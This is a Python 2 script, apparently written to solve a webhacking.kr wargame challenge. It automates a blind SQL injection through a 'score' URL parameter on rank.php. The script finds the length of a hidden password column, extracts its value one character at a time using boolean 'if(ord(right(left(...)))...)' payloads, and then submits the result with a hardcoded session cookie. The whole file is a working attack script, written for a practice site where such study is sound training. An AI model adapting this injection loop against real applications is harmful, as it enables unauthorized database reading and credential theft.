#-*- coding: utf-8 -*-
import sys
import urllib
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-31/rank.php"
trueCondition  = "localhost"

print "[+] Find password length"
passwordLength = 0
isFoundPassword = False

CookieManager.addCookie("PHPSESSID", "73ea5f35f558006f21f6185c171a2ed9")

for passwordLength in range(1, 30):
    parameter = "1%20or%20if(length(pAsSw0RdzzzZ)="+str(passwordLength)+",1,0)"
    
    httpRequest = urllib2.Request(challengeUrl+"?score="+parameter)
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        print "[*] Blind SQL Injection...", passwordLength
        if httpResponse.find(trueCondition) > 0:
            print "[!] FIND IT! password length is [", passwordLength, "]"
            isFoundPassword = True
            break
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()

if not isFoundPassword:
    sys.exit(-1)

print "[+] Find password value"
passwordValue = ""
    
for caretIndex in range(1, passwordLength+1):
    print
    print "[*] Blind SQL Injection...", caretIndex, "", 
    for charIndex in range(0x61, 0x7f) + range(0x30, 0x3A):
        sys.stdout.write(".")
        parameter = "1 or if(ord(right(left(pAsSw0RdzzzZ,%d),1))=%d,1,0)" % (caretIndex, charIndex)
        httpRequest = urllib2.Request(challengeUrl+"?score="+urllib.quote(parameter))
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            if httpResponse.find(trueCondition) > 0:
                print 
                print "[+] FIND IT!", chr(charIndex)
                passwordValue += chr(charIndex)
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

if passwordValue.__len__() != passwordLength:
    sys.exit(0)
                    
print "[!] password is [", passwordValue, "]"

print "[*] Auth Challenge 55"
challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
parameter = urllib.urlencode({
    "answer": passwordValue
});
httpRequest = urllib2.Request(challengeUrl, data=parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
